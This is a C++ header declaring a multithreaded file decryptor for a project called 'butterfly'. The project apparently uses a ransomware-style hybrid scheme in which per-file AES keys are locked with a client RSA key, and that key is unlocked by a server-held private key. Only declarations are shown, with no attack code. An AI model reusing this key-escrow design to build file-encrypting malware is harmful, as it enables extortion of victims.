
#ifndef BUTTERFLY_DECRYPTOR_H
#define BUTTERFLY_DECRYPTOR_H

#include <thread>

#include "crypto/rsaDecryptor.h"
#include "crypto/aesDecryptor.h"
#include "directoryIterator.h"
#include "bflyExceptions.h"
#include "bflyParams.h"

namespace butterfly
{

namespace hybrid
{

/**
 * Class Decryptor to decrypt files with AES, CPrivateRSA and AESKeyPair(Key+IV) with RSA
 */
class Decryptor
{

private:
    std::string _decryptedCPrivateRSA, _aesKeyDBPath;
    std::vector<std::thread> _threads;

    std::unique_ptr<rsa::RSADecryptor> _rsaDecryptorCPrivateRSA;
    std::unique_ptr<aes::AESDecryptor> _aesDecryptor;

    /**
     * Removes decrypted files from system
     */
    static void removeDecryptedFiles();

    /**
     * Get the AESKeyPair string from the unencrypted file
     *
     * @param aesKeyPair: string reference to the aeskeypair
     * @return True if reading was successful else False
     */
    static bool getAESKeyPairFromUnencryptedFile(std::string &aesKeyPair);

public:

    /**
     * Constructor Decryptor
     *
     *  Usage:
     *       std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
     *       decryptor->invokeDir("/home/", "SPrivateRSA.pem");
     *
     * @param aesKeyDBPath: Path to the AESKey Database
     */
    explicit Decryptor(const std::string &aesKeyDBPath = "AES.db");

    /**
     * Destructor Decryptor
     */
    ~Decryptor() = default;

    /**
     * Invokes the directory to start the decryption process
     *
     * @param dirPath: path to the directory
     * @param pkeyFromServer: SPrivateRSA.pem from server (corresponds to the embedded SPublicKey.pem)
     */
    void invokeDir(const std::string &dirPath, const std::string &pkeyFromServer);

    /**
     * Decrypt the CPrivateRSA.bin file
     *
     * @param pkeyFromServer: SPrivateRSA.pem from server (corresponds to the embedded SPublicKey.pem)
     * @param encCPrivateRSAFile: encrypted CPrivateRSA.bin file
     */
    void decryptCPrivateRSA(const std::string &pkeyFromServer, const std::string &encCPrivateRSAFile);

    /**
     * Decrypts the AESKey.bin file to be able to get the decrypted AESKEY/AESIV
     *
     * @param filepathAESKey: path to the AESKey.bin
     * @param decAESKey: decrypted AESKey string
     * @param decAESIV: decrypted AESIV string
     */
    void decryptAESKeyPair(const std::string &filepathAESKey, std::string &decAESKey,  std::string &decAESIV);

    /**
     * Decrypt the file with the AES Key/IV pair
     *
     * @param filepath: path to the file
     * @param aesKey: aes key for the file to decrypt
     * @param aesIV: aes iv for the file to decrypt
     */
    void decryptFileWithAES(const std::string &filepath);

    /**
     * Spawns a new Thread for encrypting the file
     *
     * @param filepath: path to the file
     */
    void spawnThread(const std::string &filepath);

    /**
     * Joins the threads in the thread vector
     */
    void joinThreads();
};


} // namespace hybrid

} // namespace butterfly

#endif //BUTTERFLY_DECRYPTOR_H
